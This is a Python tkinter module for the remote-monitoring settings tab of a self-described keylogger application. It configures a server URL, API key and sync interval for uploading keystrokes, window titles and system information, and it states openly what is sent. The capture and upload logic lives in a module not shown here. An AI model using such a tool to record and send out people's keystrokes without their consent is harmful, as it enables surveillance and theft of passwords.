"""
Remote monitoring tab for the keylogger application
Provides UI for configuring remote monitoring settings
"""

import tkinter as tk
from tkinter import ttk, messagebox
from gui.utils.styles import COLORS, BUTTON_STYLES, FRAME_STYLES, LABEL_STYLES, TEXT_STYLES

class RemoteTab:
    def __init__(self, parent, app):
        """
        Initialize the remote monitoring tab
        
        Args:
            parent: Parent frame
            app: Main application instance
        """
        self.parent = parent
        self.app = app
        self.frame = tk.Frame(parent, bg=COLORS["bg_light"])
        
        self.create_widgets()
        
    def create_widgets(self):
        """Create the tab widgets"""
        # Title
        title_label = tk.Label(self.frame, text="Remote Monitoring", **LABEL_STYLES["title"])
        title_label.pack(pady=10)
        
        # Connection status frame
        status_frame = tk.LabelFrame(self.frame, text="Connection Status", 
                                   bg=COLORS["bg_light"], fg=COLORS["primary"])
        status_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Status indicators
        status_inner_frame = tk.Frame(status_frame, bg=COLORS["bg_light"])
        status_inner_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Status light (circle indicator)
        self.status_canvas = tk.Canvas(status_inner_frame, width=20, height=20, 
                                     bg=COLORS["bg_light"], highlightthickness=0)
        self.status_canvas.pack(side=tk.LEFT, padx=5)
        self.status_light = self.status_canvas.create_oval(2, 2, 18, 18, fill=COLORS["accent"])
        
        # Status text
        self.status_label = tk.Label(status_inner_frame, text="Disconnected", 
                                   **LABEL_STYLES["status"])
        self.status_label.pack(side=tk.LEFT, padx=5)
        
        # Device ID
        self.device_id_label = tk.Label(status_inner_frame, text="Device ID: Not generated", 
                                      **LABEL_STYLES["normal"])
        self.device_id_label.pack(side=tk.RIGHT, padx=5)
        
        # Settings frame
        settings_frame = tk.LabelFrame(self.frame, text="Remote Settings", 
                                     bg=COLORS["bg_light"], fg=COLORS["primary"])
        settings_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Create a grid for settings
        settings_grid = tk.Frame(settings_frame, bg=COLORS["bg_light"])
        settings_grid.pack(fill=tk.X, padx=10, pady=10)
        
        # Server URL
        tk.Label(settings_grid, text="Server URL:", bg=COLORS["bg_light"]).grid(row=0, column=0, sticky=tk.W, pady=5)
        self.server_url_var = tk.StringVar(value="http://localhost:5000")
        server_entry = tk.Entry(settings_grid, textvariable=self.server_url_var, width=40)
        server_entry.grid(row=0, column=1, sticky=tk.W, pady=5)
        
        # API Key
        tk.Label(settings_grid, text="API Key:", bg=COLORS["bg_light"]).grid(row=1, column=0, sticky=tk.W, pady=5)
        self.api_key_var = tk.StringVar()
        api_key_entry = tk.Entry(settings_grid, textvariable=self.api_key_var, width=40, show="*")
        api_key_entry.grid(row=1, column=1, sticky=tk.W, pady=5)
        
        # Sync interval
        tk.Label(settings_grid, text="Sync Interval (seconds):", bg=COLORS["bg_light"]).grid(row=2, column=0, sticky=tk.W, pady=5)
        self.sync_interval_var = tk.StringVar(value="60")
        sync_entry = tk.Entry(settings_grid, textvariable=self.sync_interval_var, width=10)
        sync_entry.grid(row=2, column=1, sticky=tk.W, pady=5)
        
        # Enable checkbox
        self.enable_var = tk.BooleanVar(value=False)
        enable_check = tk.Checkbutton(settings_grid, text="Enable Remote Monitoring", 
                                    variable=self.enable_var, bg=COLORS["bg_light"],
                                    command=self.toggle_remote)
        enable_check.grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=5)
        
        # Control buttons frame
        control_frame = tk.Frame(self.frame, bg=COLORS["bg_light"])
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Apply settings button
        self.apply_button = tk.Button(control_frame, text="Apply Settings", 
                                    command=self.apply_settings,
                                    **BUTTON_STYLES["secondary"])
        self.apply_button.pack(side=tk.LEFT, padx=5)
        
        # Test connection button
        self.test_button = tk.Button(control_frame, text="Test Connection", 
                                   command=self.test_connection,
                                   **BUTTON_STYLES["primary"])
        self.test_button.pack(side=tk.LEFT, padx=5)
        
        # Information about what is sent
        info_frame = tk.LabelFrame(self.frame, text="Data Sharing Information", 
                                 bg=COLORS["bg_light"], fg=COLORS["primary"])
        info_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        info_text = tk.Text(info_frame, height=8, wrap=tk.WORD, 
                          bg=COLORS["bg_light"], padx=10, pady=10,
                          relief=tk.FLAT, highlightthickness=0)
        info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        info_text.insert(tk.END, "When remote monitoring is enabled, the following information is sent to the configured server:\n\n")
        info_text.insert(tk.END, "• Keystrokes and input events\n")
        info_text.insert(tk.END, "• Window title information\n")
        info_text.insert(tk.END, "• Flagged commands with timestamps\n")
        info_text.insert(tk.END, "• System information (hostname, IP address for device identification)\n\n")
        info_text.insert(tk.END, "Make sure you're using a secure and trusted server. All data is transmitted with encryption if using HTTPS.")
        
        info_text.config(state=tk.DISABLED)  # Make read-only
        
    def show(self):
        """Show the tab"""
        self.frame.pack(fill=tk.BOTH, expand=True)
        self.update_status_display()
        
    def hide(self):
        """Hide the tab"""
        self.frame.pack_forget()
        
    def toggle_remote(self):
        """Toggle remote monitoring based on checkbox"""
        if hasattr(self.app, 'remote_monitor'):
            enabled = self.enable_var.get()
            self.app.remote_monitor.enable(enabled)
            self.update_status_display()
            
    def apply_settings(self):
        """Apply the remote monitoring settings"""
        if not hasattr(self.app, 'remote_monitor'):
            messagebox.showerror("Error", "Remote monitoring module not initialized.")
            return
            
        # Get values from inputs
        server_url = self.server_url_var.get()
        api_key = self.api_key_var.get()
        
        try:
            sync_interval = int(self.sync_interval_var.get())
            if sync_interval < 10:
                messagebox.showwarning("Warning", "Sync interval must be at least 10 seconds. Setting to 10 seconds.")
                sync_interval = 10
                self.sync_interval_var.set("10")
        except ValueError:
            messagebox.showerror("Error", "Sync interval must be a number.")
            return
            
        # Update settings
        self.app.remote_monitor.set_server_url(server_url)
        self.app.remote_monitor.set_api_key(api_key)
        self.app.remote_monitor.set_sync_interval(sync_interval)
        
        # Toggle remote monitoring if enabled
        enabled = self.enable_var.get()
        self.app.remote_monitor.enable(enabled)
        
        # Update display
        self.update_status_display()
        
        messagebox.showinfo("Settings Applied", "Remote monitoring settings have been applied.")
        
    def test_connection(self):
        """Test the connection to the remote server"""
        if not hasattr(self.app, 'remote_monitor'):
            messagebox.showerror("Error", "Remote monitoring module not initialized.")
            return
            
        # Apply current settings first
        self.apply_settings()
        
        # Try to send a test ping
        import threading
        
        def test_thread():
            # Get current status
            status = self.app.remote_monitor.get_status()
            
            if not status["enabled"]:
                # Temporarily enable for testing
                self.app.remote_monitor.enable(True)
                
                # Wait a bit for connection
                import time
                time.sleep(2)
                
                # Get updated status
                status = self.app.remote_monitor.get_status()
                
                # Display result
                if "Connected" in status["status"]:
                    messagebox.showinfo("Connection Test", "Successfully connected to the remote server.")
                else:
                    messagebox.showerror("Connection Test", f"Failed to connect: {status['status']}")
                    
                # Restore previous state
                self.app.remote_monitor.enable(False)
                self.enable_var.set(False)
            else:
                # Already enabled, just check status
                if "Connected" in status["status"]:
                    messagebox.showinfo("Connection Test", "Successfully connected to the remote server.")
                else:
                    messagebox.showerror("Connection Test", f"Failed to connect: {status['status']}")
            
            # Update the display
            self.app.root.after(0, self.update_status_display)
        
        # Run the test in a separate thread to avoid freezing the UI
        threading.Thread(target=test_thread).start()
        
    def update_status_display(self):
        """Update the status display"""
        if not hasattr(self.app, 'remote_monitor'):
            self.status_label.config(text="Module not initialized")
            self.status_canvas.itemconfig(self.status_light, fill=COLORS["accent"])
            return
            
        # Get current status
        status = self.app.remote_monitor.get_status()
        
        # Update device ID
        self.device_id_label.config(text=f"Device ID: {status['device_id'][:8]}...")
        
        # Update status text
        self.status_label.config(text=status["status"])
        
        # Update status light color
        if status["running"] and "Connected" in status["status"]:
            self.status_canvas.itemconfig(self.status_light, fill=COLORS["success"])
        elif status["running"] and "Connecting" in status["status"]:
            self.status_canvas.itemconfig(self.status_light, fill=COLORS["warning"])
        else:
            self.status_canvas.itemconfig(self.status_light, fill=COLORS["accent"])
            
        # Update checkbox
        self.enable_var.set(status["enabled"])